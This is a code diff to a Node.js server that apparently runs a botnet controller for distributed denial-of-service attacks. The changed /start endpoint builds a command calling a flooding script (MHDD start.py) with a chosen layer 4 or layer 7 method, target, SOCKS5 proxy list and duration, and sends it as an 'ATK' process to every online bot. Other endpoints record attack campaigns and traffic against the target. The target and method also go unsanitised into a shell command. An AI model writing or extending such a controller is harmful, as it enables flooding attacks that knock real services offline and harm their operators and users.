@@ -136,7 +136,7 @@ app.post('/connect', async (req, res) => {
 // Update endpoint
 app.post('/update', async (req, res) => {
     try {
-        const { instanceId, rps, gps, processes } = req.body;
+        const { instanceId, rps, gps, processes, campaign } = req.body;
 
         if (!instanceId) {
             return res.status(400).json({
@@ -165,6 +165,7 @@ app.post('/update', async (req, res) => {
                 batch.set(docRef, {
                     ...parsedOutput,
                     instanceId,
+                    campaign,
                     servertime: new Date().getTime(),
                     createdAt: admin.firestore.FieldValue.serverTimestamp()
                 });
@@ -196,12 +197,12 @@ app.post('/update', async (req, res) => {
 
 app.post('/start', async (req, res) => {
     try {
-        const { command, target, duration } = req.body;
+        const { target, duration, layer, method } = req.body;
 
-        if (!command || !target) {
+        if (!target || !layer|| !method) {
             return res.status(400).json({
                 status: 'error',
-                message: 'Command and target are required'
+                message: 'Target, method and layer are required'
             });
         }
 
@@ -214,11 +215,25 @@ app.post('/start', async (req, res) => {
             });
         }
 
+        let finalCommand = '';
+        if (layer === '7') {
+            finalCommand = `source /home/ubuntu/MHDD/venv/bin/activate && python /home/ubuntu/MHDD/start.py ${method} ${target} 0 120 socks5.txt 3000 ${monitoringDuration} true`;
+        } else if (layer === '4') {
+            finalCommand = `source /home/ubuntu/MHDD/venv/bin/activate && python /home/ubuntu/MHDD/start.py ${method} ${target} 1 ${monitoringDuration} true`;
+        } else {
+            return res.status(400).json({
+                status: 'error',
+                message: 'Invalid layer specified. Must be either "4" or "7"'
+            });
+        }
+
         // Create campaign document
         const campaignData = {
-            command,
+            command: finalCommand,
             target,
             duration: monitoringDuration,
+            layer,
+            method,
             status: 'running',
             startTime: admin.firestore.FieldValue.serverTimestamp(),
             instances: []
@@ -248,13 +263,6 @@ app.post('/start', async (req, res) => {
             });
         }
 
-        // Prepare command with target inserted
-        let finalCommand = command
-            .replace('{target}', target)
-            .replace('{duration}', duration);
-
-
-
         // Send command to all online instances
         const sendPromises = instancesSnapshot.docs.map(async (doc) => {
             const instance = doc.data();
@@ -265,7 +273,8 @@ app.post('/start', async (req, res) => {
                     action: 'start',
                     processId: 'ATK',
                     command: finalCommand,
-                    duration: monitoringDuration // Pass duration to instances
+                    duration: monitoringDuration,
+                    campaign: campaignRef.id 
                 });
 
                 await campaignsCollection.doc(campaignRef.id).update({
@@ -484,16 +493,18 @@ app.post('/stop', async (req, res) => {
 
 app.get('/trafficData', async (req, res) => {
     try {
-        const { startDate, endDate, target } = req.query;
+        const { startDate, endDate, target, campaignId } = req.query;
 
         // Query traffic logs
         let trafficQuery = db
             .collection('target-logs')
+            .where('campaignId', '==', campaignId)
             .orderBy('servertime', 'asc');
 
         // Query health checks
         let healthQuery = db
             .collection('target-health')
+            .where('campaignId', '==', campaignId)
             .orderBy('timestamp', 'asc');
 
         // Apply filters to traffic query
